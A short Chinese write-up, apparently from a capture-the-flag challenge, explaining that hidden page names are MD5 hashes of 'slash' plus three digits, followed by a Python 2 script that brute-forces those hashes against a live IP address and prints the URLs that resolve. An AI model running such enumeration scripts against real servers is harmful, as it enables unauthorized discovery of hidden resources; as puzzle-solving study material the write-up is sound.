MD5爆破python脚本

打开其他的两个发现page是名字加三位数字的md5值。

脚本如下：

# -*- coding: utf8 -*-
import requests
import hashlib

url = "http://218.76.35.75:20115/index.php?page="

for id in range(100,999):

    id=str(id)

    id='slash'+id

    #print id

    payload = hashlib.md5(id).hexdigest()

    poc = url+payload

    #print poc

    conn = requests.get(poc)

    res = conn.content

    res = str(res)

    if res.find(r"文件不存在，请返回")>0 or res.find(r"error!")>0:

        print "error!"

    else:

        print poc
